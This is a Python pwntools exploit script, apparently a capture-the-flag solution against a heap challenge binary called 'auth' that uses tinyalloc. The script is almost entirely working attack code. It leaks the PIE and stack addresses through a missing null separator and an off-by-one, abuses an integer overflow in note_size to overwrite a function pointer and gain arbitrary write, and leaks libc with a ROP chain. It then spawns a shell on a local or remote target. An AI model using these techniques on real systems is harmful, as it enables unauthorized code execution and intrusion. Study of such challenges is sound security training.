from pwn import *
from sys import argv

remote = False
if "-r" in argv:  # Switch between local and remote
	remote = True

elf = context.binary = ELF("./auth")

if remote:
	conn = connect("178.62.63.223", 30493)
	libc = ELF("./libc-remote.so.6")
else:
	libc = ELF("./libc-local.so.6")
	
	# conn = process("./auth")
	context.gdbinit = "~/peda/peda.py"
	conn = gdb.debug("./auth", '''
	break *print_author
	break *main
	c
	''')  # Using pwn.gdb for debug, can switch to straight process

def address_from_bytes(by):  # Take a bytestring as input, pad and convert to address
	by += b"\x00" * (8 - len(by))
	by = u64(by)
	return by

def add_author(first_name, sur_name, age, note_size, note=None):  # Interact with add_author function
	conn.recvuntil(b"Choice: ", timeout=1)
	conn.sendline(b"1")
	conn.recvuntil(b": ")
	conn.sendline(first_name.encode())
	conn.recvuntil(b": ")
	conn.sendline(sur_name.encode())
	conn.recvuntil(b": ")
	conn.sendline(str(age).encode())
	conn.recvuntil(b": ")
	conn.sendline(str(note_size).encode())
	
	if note:  # If note_size is 0, program won't ask for note contents
		conn.recvuntil(b": ")
		conn.sendline(note.encode() if type(note) == str else note)
	
	index = int(conn.recvline().split(b" ")[1].decode())  # Extract assigned id from response
	return index

def modify_author(index, first_name, sur_name, age):  # Interact with modify_author function
	conn.recvuntil(b"Choice: ", timeout=1)
	conn.sendline(b"2")
	conn.recvuntil(b": ")
	conn.sendline(str(index).encode())
	conn.sendline(first_name.encode())
	conn.recvuntil(b": ")
	conn.sendline(sur_name.encode())
	conn.recvuntil(b": ")
	conn.sendline(str(age).encode())
	conn.recvuntil(b": ")

def print_author(index):  # Interact with print_author function
	conn.recvuntil(b"Choice: ", timeout=1)
	conn.sendline(b"3")
	conn.recvuntil(b": ")
	conn.sendline(str(index).encode())
	
	return conn.recv(4096)

def delete_author(index):  # Interact with delete_author function
	conn.recvuntil(b"Choice: ", timeout=1)
	conn.sendline(b"4")
	conn.recvuntil(b": ")
	conn.sendline(str(index).encode())
	conn.recvline()

def leak_pie():
	"""
	This function leaks the pie address for PrintNote.
	
	Method:
	1. Create one author with a note of size 200
	2. Create a second author with any note size
	3. Delete both authors, marking them free
	4. Create new author, with note of size 256
	   add_author function increments size by one, no null-byte exist as seperator
	6. Printf continues reading after note, correct alligment means PrintNote address is printed
	7. Stonks
	
	Same method could be used to leak the stack, but the binary provides an easier and cleaner method.
	"""

	a1 = add_author("A" * 8, "B" * 8, 16, 200, "C" * 8)
	a2 = add_author("D" * 8, "E" * 8, 16, 8, "F" * 8)

	delete_author(a1)
	delete_author(a2)

	a1 = add_author("G" * 8, "H" * 8, 16, 256, "I" * 257)
	res = print_author(a1)

	last_i = res.rfind(b"I")
	last_b = res.rfind(b"]")

	pie_leak = address_from_bytes(res[last_i + 1: last_b])
	delete_author(a1)
	
	return pie_leak

def leak_stack():
	"""
	This function leaks the Note address for a given author.
	Since tinyalloc is deterministic (obvio), we can apply a static offset to calculate rip
	
	Method:
	1. Create any author
	2. Modify the surname of the author, abusing the off by one error in modify author
	3. Call print_author, printf reads over surname and Note address
	
	As mentioned in leak_pie, there are actually two methods to leak the stack
	
	"""

	a1 = add_author("A" * 8, "B" * 15, 16, 8, "C" * 8)
	modify_author(a1, "A" * 8, "B" * 16, 16)
	res = print_author(a1)
	
	first = res.rfind(b"BBBB") + 4
	last = res.find(b"\nAge:")
	
	heap_leak = address_from_bytes(res[first: last])
	rip = heap_leak  - 0x150  # Static offset manually calculated
	
	delete_author(a1)
	
	return rip

def cleanup():
	"""
	Bit of an irrelevant function to clean the heap up a bit when debugging
	Doesn't really do much
	
	"""

	a1 = add_author("", "", 0, 256, (b"\x00" * 256).decode())
	a2 = add_author("", "", 0, 256, (b"\x00" * 256).decode())
	a3 = add_author("", "", 0, 256, (b"\x00" * 256).decode())
	
	delete_author(a1)
	delete_author(a2)
	delete_author(a3)

def create_write_gadget(address):
	"""
	Probably the most interesting function. Generates an author for arbitrary write to the program
	
	Method:
	1. Create 2 authors with any size Note
	2. Delete first author, chunk is put into freed
	3. Create new author with a Note size of 2**64 - 1
	   add_author increments note_size by one as padding, overflowing the integer
	   tinyalloc allocates previous used space, together with pointer for 0-byte chunk
	   add_author sets default length 256, we can write bytes into 0-byte chunk
	   Note is carefully crafted, such that it overwrites:
	   - PrintNote with get_from_user
	   - *Note with rip-pointer
	   print_author will now trigger get_from_user
	
	Damn that is cool. Great challenge!
	
	"""

	a1 = add_author("A" * 8, "B" * 8, 0x100, 8, "C" * 8)
	a2 = add_author("D" * 8, "E" * 8, 0x100, 8, "F" * 8)
	
	delete_author(a1)
	
	note = b"A" * (4 * 8 + 16)
	note += p64(address)
	note += b"A" * 8
	note += p64(elf.sym["get_from_user"])

	a1 = add_author("A" * 8, "B" * 8, 0x100, 2**64 - 1, note)
	return a2

def arbitrary_write(author, payload, wait=True):
	# Use poisoned author to write to fixed address

	if wait:  # Function may be called from rop-chain, don't select menu
		conn.recvuntil(b"Choice: ", timeout=1)
		conn.sendline(b"3")
	
	conn.recvuntil(b": ")
	conn.sendline(str(author).encode())
	
	conn.recvuntil(b"Age: ")  # Following age being printed, get_from_user is called
	conn.sendline(payload)

def leak_libc(author):
	# leak libc using got, can be changed to determine libc version

	payload = p64(pop_rdi)
	payload += p64(elf.got["puts"])
	payload += p64(elf.plt["puts"])
	payload += p64(elf.sym["print_author"])
	
	arbitrary_write(author, payload)
	
	conn.recvuntil(b"\n\n")
	puts_leak = address_from_bytes(conn.recvline()[:-1])
	
	return puts_leak

def get_shell(author):
	# The final goal: obtain shell either locally or remotely

	if remote:  # Use one_gadget generated by one_gadget
		one_gadget = 0x10a41c + libc.address
		payload = p64(one_gadget)
	else:  # Modern libc versions don't have one_gadgets, do it manually
		payload = p64(pop_rdi)
		payload += p64(next(libc.search(b"/bin/sh\x00")))
		payload += p64(libc.sym["system"])
	
	arbitrary_write(author, payload, wait=False)
	
	conn.interactive()

elf.address = leak_pie() - elf.sym["PrintNote"]
print(f"Leaked pie address {hex(elf.address)}")

rop = ROP(elf)
pop_rdi = rop.rdi.address

rip = leak_stack()
print(f"Leaked rip address {hex(rip)}")

cleanup()

write_gadget = create_write_gadget(rip)
puts_leak = leak_libc(write_gadget)
libc.address = puts_leak - libc.sym["puts"]
print(f"Leaked libc address {hex(libc.address)}")

get_shell(write_gadget)